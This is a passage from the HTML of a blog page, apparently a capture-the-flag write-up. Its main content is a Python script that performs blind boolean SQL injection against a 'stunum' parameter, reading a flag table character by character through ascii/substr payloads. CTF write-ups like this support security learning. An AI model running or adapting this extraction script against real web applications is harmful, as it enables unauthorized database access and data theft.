</span></span><span style=display:flex><span>chars <span style=color:#f92672>=</span> <span style=color:#e6db74>r</span><span style=color:#e6db74>&#34;flag{-}&#34;</span> <span style=color:#f92672>+</span> string<span style=color:#f92672>.</span>digits <span style=color:#f92672>+</span> string<span style=color:#f92672>.</span>ascii_lowercase 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>45</span>):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> chars:
</span></span><span style=display:flex><span>        payload <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;0^(ascii(substr((select(group_concat(value))from(flag)where(value)regexp(&#39;flag&#39;)),</span><span style=color:#e6db74>{</span>i<span style=color:#e6db74>}</span><span style=color:#e6db74>,1))=</span><span style=color:#e6db74>{</span>ord(c)<span style=color:#e6db74>}</span><span style=color:#e6db74>)&#34;</span>
</span></span><span style=display:flex><span>        params <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;stunum&#34;</span>: payload}
</span></span><span style=display:flex><span>        resp <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url, params<span style=color:#f92672>=</span>params)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;admin&#34;</span> <span style=color:#f92672>in</span> resp<span style=color:#f92672>.</span>text:
</span></span><span style=display:flex><span>            print(c)
</span></span><span style=display:flex><span>            flag <span style=color:#f92672>+=</span> c
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>print(flag)
</span></span></code></pre></div><hr></div><footer class=post-footer><ul class=post-tags></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://blog.w8nn9z.top/>w8nn9z Blog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>